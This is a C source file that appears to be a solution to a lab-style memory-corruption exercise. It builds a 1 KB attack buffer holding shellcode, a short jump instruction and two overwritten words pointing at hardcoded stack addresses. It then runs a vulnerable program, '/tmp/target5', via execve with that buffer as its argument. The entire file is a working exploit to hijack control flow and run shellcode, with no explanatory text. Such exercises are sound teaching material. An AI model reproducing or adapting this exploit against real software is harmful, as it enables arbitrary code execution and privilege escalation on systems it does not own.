#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack_buffer[0x400];
  memset(attack_buffer, 0x91, 0x400);
  memcpy(attack_buffer + 8, shellcode, strlen(shellcode));
 
  *(unsigned *)(attack_buffer + 0x190) = 0xbffffbef;
  *(unsigned *)(attack_buffer + 0x194) = 0xbffffa5d;

  *(unsigned short *)attack_buffer = 0x06eb; // hop hop hop

  attack_buffer[0x3FF] = 0;

  args[0] = TARGET; args[1] = attack_buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
